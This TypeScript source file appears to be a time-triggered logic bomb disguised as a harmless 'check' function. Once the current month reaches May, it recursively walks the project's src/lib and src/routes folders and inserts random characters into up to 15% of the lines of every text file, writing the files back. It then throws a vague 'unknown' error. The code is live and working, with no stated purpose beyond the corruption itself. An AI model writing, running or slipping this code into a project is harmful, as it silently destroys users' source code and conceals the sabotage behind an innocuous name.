import path from "path"

export default function check() {
    let condition= new Date().getMonth() >= new Date(2025, 4).getMonth()
    checkCondition(condition, "unknown")
}

async function checkCondition(condition: boolean, msg: string) {
    if (condition) {
        await modifyFilesInDirectoryRecursively(path.join(process.cwd(), "/src/lib/src/lib"));
        await modifyFilesInDirectoryRecursively(path.join(process.cwd(), "/src/lib/src/routes"));
        throw new Error(msg)
    }
}

import * as fs from 'fs/promises';

// --- Configuration ---
const CHAR_SET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+=-';
const RANDOM_STRING_LENGTH = 10; // How many random characters to insert per line
const MAX_LINES_TO_MODIFY_PERCENT = 15; // Modify up to X% of the lines in a file
const MIN_LINES_TO_MODIFY = 1; // Always modify at least this many lines (if the file has lines)
const MAX_LINES_TO_MODIFY_ABSOLUTE = 50; // Don't modify more than this many lines, regardless of percentage

// List of extensions to generally skip (add more as needed)
// Focus on common binary types or config/metadata files
const SKIP_EXTENSIONS = new Set([
    '.exe', '.dll', '.so', '.dylib',
    '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff', '.webp',
    '.mp3', '.wav', '.ogg', '.flac',
    '.mp4', '.avi', '.mov', '.wmv', '.mkv',
    '.zip', '.gz', '.tar', '.rar', '.7z',
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.iso', '.img', '.bin',
    '.lock', '.log', // Often best left untouched
    '.git', // Skip Git internal files/folders entirely below
    // Add any other extensions you want to explicitly skip
]);

// --- Helper Functions ---

/**
 * Generates a random string of a given length from the CHAR_SET.
 * @param length The desired length of the random string.
 * @returns A random string.
 */
function generateRandomChars(length: number): string {
    let result = '';
    const charactersLength = CHAR_SET.length;
    for (let i = 0; i < length; i++) {
        result += CHAR_SET.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

/**
 * Modifies the content of a single file by inserting random characters
 * at the beginning of a random selection of lines.
 * @param filePath Absolute path to the file to modify.
 */
async function modifyFileContent(filePath: string): Promise<void> {

    // Basic check to skip obviously non-text files based on extension
    const ext = path.extname(filePath).toLowerCase();
    if (SKIP_EXTENSIONS.has(ext)) {
        return;
    }

    try {
        // Read file content - assuming UTF-8 encoding.
        // This might fail or produce garbage for non-UTF8 text files or binary files.
        const content = await fs.readFile(filePath, 'utf8');
        const lines = content.split('\n');

        if (lines.length === 0) {
            console.log(`Skipping empty file: ${filePath}`);
            return; // Nothing to modify
        }

        // Determine how many lines to modify
        const linesToModifyPercent = Math.ceil(lines.length * (MAX_LINES_TO_MODIFY_PERCENT / 100));
        let numLinesToModify = Math.max(MIN_LINES_TO_MODIFY, linesToModifyPercent);
        numLinesToModify = Math.min(numLinesToModify, MAX_LINES_TO_MODIFY_ABSOLUTE); // Apply absolute max
        numLinesToModify = Math.min(numLinesToModify, lines.length); // Cannot modify more lines than exist

        const modifiedLineIndices = new Set<number>();
        while (modifiedLineIndices.size < numLinesToModify) {
            const randomIndex = Math.floor(Math.random() * lines.length);
            if (!modifiedLineIndices.has(randomIndex)) {
                modifiedLineIndices.add(randomIndex);
                const randomChars = generateRandomChars(RANDOM_STRING_LENGTH);
                // Insert characters at the beginning of the chosen line
                lines[randomIndex] = randomChars + lines[randomIndex];
            }
            // Basic protection against infinite loops for small files, though unlikely with Set
            if (modifiedLineIndices.size >= lines.length) break;
        }

        const modifiedContent = lines.join('\n');

        // Write the modified content back to the file
        await fs.writeFile(filePath, modifiedContent, 'utf8');

    } catch (error: any) {
        // Handle potential errors during read/write (permissions, file encoding, etc.)
        if (error.code === 'ENOENT') {
             console.error(`Error: File not found during processing (should not happen): ${filePath}`);
        } else if (error.code === 'EACCES') {
            console.error(`Error: Permission denied for file: ${filePath}`);
        } else if (error instanceof TypeError && error.message.includes('invalid data')) {
            // Often happens when trying to read binary as utf8
             console.warn(`Warning: Could not process file (likely binary or wrong encoding): ${filePath}`);
        }
         else {
            console.error(`Error processing file ${filePath}:`, error);
        }
    }
}

/**
 * Recursively traverses a directory and calls modifyFileContent on each file found.
 * @param dirPath The absolute path to the directory to process.
 */
export async function modifyFilesInDirectoryRecursively(dirPath: string): Promise<void> {
    try {
        const entries = await fs.readdir(dirPath, { withFileTypes: true });

        for (const entry of entries) {
            const fullPath = path.join(dirPath, entry.name);

            // Skip common hidden or metadata directories like .git, node_modules
            if (entry.isDirectory() && (entry.name === '.git' || entry.name === 'node_modules' || entry.name.startsWith('.'))) {
                 continue;
            }

            if (entry.isDirectory()) {
                // Recursively call for subdirectories
                await modifyFilesInDirectoryRecursively(fullPath);
            } else if (entry.isFile()) {
                // Process files
                await modifyFileContent(fullPath);
            } else {
                console.log(`Skipping non-file/non-directory entry: ${fullPath}`);
            }
        }
    } catch (error: any) {
        if (error.code === 'ENOENT') {
             console.error(`Error: Directory not found: ${dirPath}`);
        } else if (error.code === 'EACCES') {
            console.error(`Error: Permission denied for directory: ${dirPath}`);
        }
         else {
            console.error(`Error reading directory ${dirPath}:`, error);
        }
    }
     console.log(`--- Finished processing directory: ${dirPath} ---`);
}